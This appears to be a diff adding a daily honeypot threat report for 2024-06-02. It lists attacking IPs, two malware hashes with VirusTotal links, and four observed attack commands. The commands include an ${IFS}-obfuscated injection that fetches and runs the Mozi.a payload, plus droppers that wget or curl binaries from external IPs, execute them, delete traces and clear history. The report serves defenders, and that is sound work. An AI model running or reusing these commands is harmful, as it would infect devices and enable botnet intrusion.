@@ -1,0 +1,29 @@
+Top 5 IPs for 2024-06-02 :
+
+223.17.41.207
+42.177.121.27
+119.96.76.194
+101.43.93.18
+185.171.193.125
+
+Malware Observed:
+
+File name : eyshcjdmzg
+ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+https://www.virustotal.com/gui/file/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+
+File name : http://36.48.18.114:46731/.i
+a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+
+
+Commands/exploits observed:
+
+/language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http:/61.3.95.100:59670/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+
+cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x65\\x64'
+
+
+#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c;
+
+rm .s; wget http://36.48.18.114:46731/.i; chmod 777 .i; ./.i; exit
